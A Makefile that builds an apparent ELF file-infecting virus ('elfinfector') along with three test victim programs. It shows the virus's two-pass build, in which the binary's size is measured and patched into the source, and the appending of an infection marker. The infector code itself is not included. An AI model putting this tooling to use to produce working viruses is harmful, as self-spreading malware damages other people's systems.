CC = gcc -Wall -Wextra -m32 -no-pie

all: first_prog second_prog third_prog elfinfector

first_prog second_prog third_prog: hello.c
	@echo "\033[0;31m"compiling $@..."\033[0m"
# compile test victim files
	$(CC) $< -o $@

define foo
# compile the virus
	$(CC) $(1) -o $(2)
	strip $(2)
# mark the virus as infected
	echo -n -e $$(cat $(1) | egrep '^#define INFECTED_LABEL' | sed -e 's/^#define INFECTED_LABEL "\(.\+\)".*/\1/') >> $(2)
	printf '\0' >> $(2)
endef

elfinfector: elfinfector.c
# twice compile:
# first - to compile and calculate the size of generated binary virus file
# second - to recompile taking into account the actual size of the binary virus file
	@echo "\033[0;31m"compiling $@..."\033[0m"
	$(call foo,$<,$@)
	@echo "\033[0;32m"rebuilding $@..."\033[0m"
	perl -pi -e "s/^(#define VIR_LEN) \d+(.*)$$/\$$1 $$(du -b $@ | cut -f1)\$$2/" $<
	$(call foo,$<,$@)

.PHONY: all clean

clean:
	@echo "\033[0;33m"cleaning the binary files..."\033[0m"
	rm -f first_prog second_prog third_prog elfinfector